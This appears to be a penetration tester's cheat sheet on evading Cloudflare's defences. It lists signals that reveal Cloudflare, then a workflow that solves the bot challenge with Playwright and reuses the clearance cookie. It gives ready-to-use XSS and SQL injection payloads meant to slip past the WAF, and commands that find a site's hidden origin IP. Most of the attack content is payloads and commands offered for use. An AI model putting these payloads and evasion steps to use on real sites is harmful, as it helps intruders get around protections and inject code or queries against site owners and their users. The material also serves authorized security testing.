# Cloudflare

### Detection Signals
| Signal | Where |
|--------|-------|
| `cf-ray` header | Response header (always present) |
| `__cf_bm` cookie | Bot management cookie |
| `cf-cache-status` header | HIT/MISS/DYNAMIC/BYPASS |
| `cf-mitigated` header | Set when request is challenged |
| `server: cloudflare` | Response header |
| Turnstile/hCaptcha challenge page | 403 with JavaScript challenge HTML |
| `cf-chl-bypass` header | Challenge bypass token |

### Bypass Strategy
- **Recommended tool**: Playwright (solve Turnstile automatically or manually) then reuse `cf_clearance` cookie
- **Session flow**: Playwright loads page -> solves challenge -> extract `cf_clearance` + `__cf_bm` cookies -> reuse in curl-cffi or Burp
- **curl-cffi**: Use `impersonate="chrome"` to match browser TLS fingerprint
- **Burp**: Proxy Playwright through Burp to capture authenticated session

### XSS Bypass
```
# Cloudflare WAF blocks: <script>, onerror, onload, javascript:
# Bypasses that have worked (version-dependent):

# Mutation XSS (mXSS):
<noscript><p title="</noscript><img src=x onerror=alert(1)>">

# SVG + use element:
<svg><use href="data:image/svg+xml,<svg id='x' xmlns='http://www.w3.org/2000/svg'><image href='1' onerror='alert(1)'/></svg>#x">

# Double encoding (if app decodes twice):
%253Cscript%253Ealert(1)%253C%252Fscript%253E

# Template literal (in JS context):
${alert(1)}
```

### SQLi Bypass
```
# Cloudflare blocks: standard UNION SELECT, comments, common payloads
sqlmap --tamper=charencode,between,space2mssqlblank -u URL

# Manual:
' /*!00000UNION*/ /*!00000SELECT*/ 1,2,3#
' uNiOn%23%0AsElEcT%23%0A1,2,3#
' AND(SELECT 1 FROM(SELECT COUNT(*),CONCAT(version(),0x3a,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)#
```

### Rate Limiting
- Configurable per-zone by site owner. Default: 100 req/10s for free plans.
- `cf-mitigated: challenge` when triggered.
- Block duration: 10s to 1h depending on rule.
- Recovery: Solve challenge page in Playwright.

### Origin IP Discovery
```bash
# Subdomain enumeration — some subdomains may not be proxied
subfinder -d TARGET -silent | dnsx -a -resp | grep -v "104.16\|172.67\|104.21"
# Historical DNS records
curl -s "https://api.securitytrails.com/v1/domain/TARGET/history/dns/a" -H "apikey: KEY"
# Censys certificate search
uncover -q "services.tls.certificates.leaf.names:TARGET" -e censys
# Direct IP leak via email headers, webhooks, SSRF callbacks
```

---

